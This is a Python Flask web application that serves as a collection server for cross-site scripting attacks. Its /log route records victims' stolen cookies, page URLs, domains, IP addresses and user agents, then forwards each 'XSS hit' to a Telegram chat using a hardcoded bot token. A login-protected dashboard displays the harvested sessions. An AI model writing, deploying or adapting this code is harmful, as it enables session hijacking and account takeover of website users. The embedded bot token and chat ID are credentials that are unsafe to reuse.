import os
import json
import hashlib
import datetime
from functools import wraps
from flask import Flask, request, render_template, redirect, url_for, session, flash

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "replace-this-with-env-var")

# File paths
CREDS_FILE = "credentials.json"
LOG_FILE   = "logs/hits.log"

# --- Helper Functions ---

def load_credentials():
    with open(CREDS_FILE) as f:
        return json.load(f)

def save_credentials(creds):
    with open(CREDS_FILE, "w") as f:
        json.dump(creds, f, indent=2)

def hash_password(pwd):
    return hashlib.sha256(pwd.encode()).hexdigest()

def valid_login(username, password):
    creds = load_credentials()
    return username == creds["username"] and hash_password(password) == creds["password_hash"]

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("user"):
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

# --- Routes ---

@app.route("/")
def index():
    if session.get("user"):
        return redirect(url_for("dashboard"))
    return redirect(url_for("login"))

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        if valid_login(username, password):
            session["user"] = username
            return redirect(url_for("dashboard"))
        flash("Invalid credentials", "danger")
    return render_template("login.html")

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

@app.route("/dashboard")
@login_required
def dashboard():
    hits = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            hits = [json.loads(line) for line in f]
    hits.reverse()  # Newest first
    return render_template("dashboard.html", hits=hits)

@app.route("/change_password", methods=["GET", "POST"])
@login_required
def change_password():
    if request.method == "POST":
        old = request.form["old"]
        new = request.form["new"]
        creds = load_credentials()
        if hash_password(old) == creds["password_hash"]:
            creds["password_hash"] = hash_password(new)
            save_credentials(creds)
            flash("Password changed successfully", "success")
            return redirect(url_for("dashboard"))
        else:
            flash("Old password incorrect", "danger")
    return render_template("change_password.html")

@app.route("/log")
def log():
    import requests  # Only needed inside this route
    
    os.makedirs("logs", exist_ok=True)

    data = {
        "time": datetime.datetime.utcnow().isoformat(),
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent"),
        "referrer": request.headers.get("Referer"),
        "cookie": request.args.get("c", ""),
        "domain": request.args.get("d", ""),
        "location": request.args.get("l", "")
    }

    # Save to file
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(data) + "\n")

    # Telegram config
    TELEGRAM_BOT_TOKEN = "8013237783:AAFqdzkqxoVCHFkb-lF8uyEsRC1seh0YK3o"
    TELEGRAM_CHAT_ID   = "8033396038"

    # Format message
    text = (
        "📡 <b>New XSS Hit Logged</b>\n"
        f"🕒 <b>Time:</b> {data['time']}\n"
        f"🌐 <b>Domain:</b> {data['domain']}\n"
        f"🔗 <b>URL:</b> {data['location']}\n"
        f"📥 <b>Referrer:</b> {data['referrer']}\n"
        f"🍪 <b>Cookie:</b> <code>{data['cookie']}</code>\n"
        f"💻 <b>UA:</b> {data['user_agent']}\n"
        f"📡 <b>IP:</b> {data['ip']}"
    )

    # Send to Telegram
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": text,
                "parse_mode": "HTML"
            }
        )
    except Exception as e:
        print(f"Telegram error: {e}")

    return "OK"

# --- Flask App Start (Render-compatible) ---
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
